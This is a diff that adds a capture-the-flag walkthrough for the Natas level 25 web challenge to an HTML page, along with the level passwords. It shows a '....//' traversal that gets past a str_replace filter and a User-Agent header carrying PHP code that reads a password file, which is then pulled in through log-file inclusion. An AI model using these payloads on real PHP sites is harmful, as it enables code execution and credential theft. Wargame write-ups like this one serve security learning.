@@ -18,14 +18,88 @@
         <li><b>Username:</b> natas25</li>
         <li><b>Password:</b> <code>GHF6X7YwACaYYssHVY05cFq83hRktl4c</code></li>
       </ul>
-      <p></p>
-      <p></p>
-      <p></p>
-      <p></p>
+      <p>
+        On entering the website we see a quote from Scientist, Bad Boy Buddy.
+        The quote is in english, and can be translated with a simple option
+        list to german. There is also a 'view-source' link.
+      </p>
+      <p>
+        Viewing the source-code, the site checks the request if the language is
+        available. It does that by checking 
+        <code>
+          $filename="language/"+$_REQUEST["lang"]
+        </code>
+        Let's break down the steps:
+        <ol><code>
+          <li>$filename="language/"+$_REQUEST["lang"]</li>
+          <li>strstr($filename,"../") =&#62; str_replace("../","",$filename)</li>
+          <li>strstr($filename,"natas_webpass") =&#62; abort!</li>
+          <li>on error =&#62; logRequest("some text")</li>
+          <li>file_exists($filename) =&#62; include($filename)</li>
+        </code></ol>
+      </p>
+      <p>
+        In the <code>logRequest()</code> there is a log created. A file on the
+        server. So this can be very interesting for an attack:
+        <ol>
+          <li><code>$log=</code>date + time</li>
+          <li><code>$log+=$_SERVER["HTTP-USER-AGENT"]</code></li>
+          <li><code>$log+="$message"</code></li>
+          <li>
+            log saved at <code>
+              "/var/www/natas/natas25/logs/natas25_"+session_id()+".log"
+            </code>
+          </li>
+        </ol>
+      </p>
+      <p>
+        The <code>$_SERVER["HTTP-USER-AGENT"]</code> is ours to control. So we
+        can get bad code in the logfile. But after that we need to include our
+        logfile in the <code>$_REQUEST["lang"]</code> without triggering the
+        security steps. We can't get <code>/natas_webpass/</code> in the
+        filename, because that one is checked. Let's see if we can get a
+        logfile to be displayed as quote.
+      </p>
+      <p>
+        DONE! We actually needed directory traversal. But we can trick the
+        <code>str_replace()</code> into fixing the filename for us. The code
+        isn't aborted after a bad <code>'../'</code> in the filename. So we can
+        simlpy make the filename like <code>'....//'</code>. In a phptest
+        (natas25.php) output: 
+        <code>str_replace("../","","language/....//....//....//natas")
+          =&#62; "language/../../../natas"</code>. Cool!
+      </p>
+      <p>
+        Look at natas25.py for the code. The steps I took:
+        <ol>
+          <li>post request with:
+          <ul>
+            <li><code>
+header='user-agent':'&#60;?php phpinfo(); echo readfile("/etc/natas_webpass/natas26"); ?&#62;'
+              </code> 
+              (bad code in the logfile)</li>
+            <li><code>data='lang':'natas_webpass'</code> 
+              (error lang request, to create a logfile)</li>
+            <li><code>cookies='PHPSESSID':'umphack'</code> 
+              (my own name for the logfile)</li>
+          </ul></li>
+          <li>second post request with:
+          <ul>
+            <li><code>
+data='lang':'....//....//....//....//var/www/natas/natas25/logs/natas25_umphack.log'
+              </code>
+              (include the bad logfile)</li>
+          </ul></li>
+        </ol>
+      </p>
       <ul>
         <li>Next level password:</li>
-        <li><code></code></li>
+        <li><code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></li>
       </ul>
+      <p style="font-size:80%;">PS: I love how PHP always uppercases the
+        request/post/get input. This way it's so easy to spot our attack
+        vectors xD
+      </p>
     </article>
     <script type="text/javascript">
        function autorun() {
